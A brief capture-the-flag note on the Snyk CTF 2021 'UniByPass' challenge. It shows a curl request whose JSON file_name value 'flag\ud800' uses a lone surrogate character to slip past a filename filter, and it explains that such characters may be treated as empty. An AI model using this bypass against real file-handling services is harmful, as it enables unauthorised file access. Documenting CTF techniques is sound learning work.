## Unicode Bypass
`curl --url "http://unibypass.c.ctf-snyk.io" -H "Content-Type: application/json" -d '{"file_name":"flag\ud800"}'`

In the snykctf 2021 UniByPass, the range of unicode characters from `\ud800` to `\udbff` could be interpreted as an empty string or something like that.